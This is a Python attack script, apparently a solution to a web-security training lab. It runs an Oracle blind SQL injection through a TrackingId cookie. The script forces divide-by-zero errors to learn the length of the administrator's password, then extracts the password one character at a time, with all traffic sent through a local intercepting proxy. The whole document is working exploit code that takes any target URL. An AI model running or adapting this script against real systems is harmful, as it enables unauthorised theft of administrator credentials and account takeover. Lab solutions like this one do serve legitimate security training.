import requests 
import os 
import sys
import urllib3
import string
import os
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
def getPasswordLenght(url, TrackingID):
    guessedLength  = 0
    print("Getting The Password's Length")
    while True:
        try:
            print(".",end=" ", flush=True)
            payload = f"' AND (SELECT CASE WHEN exists(select * from users where username='administrator' and LENGTH(password)= {guessedLength}) then  TO_CHAR(1/0) else 'A' END FROM dual)='A'--"
            cookies = {'TrackingId': f"{TrackingID } {payload}"}
            r = requests.get(url=url, verify=False, cookies=cookies, proxies=proxies)
            if(r.status_code==500):
                return guessedLength
            guessedLength = guessedLength +1
        except:
            print("Connection Error")
            sys.exit(-1)
def getPassword(url, TrackingID):
    gessed_password = ''
    passwordLength  = getPasswordLenght(url, TrackingID)
    print(f"\nPassword Length {passwordLength}")
    print("Cracking Passwrod: ")
    test =string.ascii_letters+ string.digits
    for length in range(1, passwordLength+1):
        for char in test:
            try:
                payload = f"' AND (SELECT CASE WHEN exists(select * from users where username='administrator' and SUBSTR(password, 1,{length})= '{gessed_password+char}') then  TO_CHAR(1/0) else 'A' END FROM dual)='A'--"
                cookies = {'TrackingId': f"{TrackingID } {payload}"}

                r = requests.get(url=url, verify=False, cookies=cookies, proxies=proxies)
                print('\r'+gessed_password+char,end="", flush=True)
                if r.status_code==500:
                    gessed_password+=(char)
                    break
            except:
                print("Connection Error")
                sys.exit(-1)
    return gessed_password




def main():
    os.system('clear')
    if(len(sys.argv)!= 3):
        print("(+) Usage: %s <url> <TrackingID> " % sys.argv[0])
        print("(+) Example: %s www.example.com PD4qQDE52qSR" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    TrackingId =sys.argv[2]
    password = getPassword(url, TrackingId)
    print('\nPassword is '+ password)
   
if __name__ == "__main__":
    main()
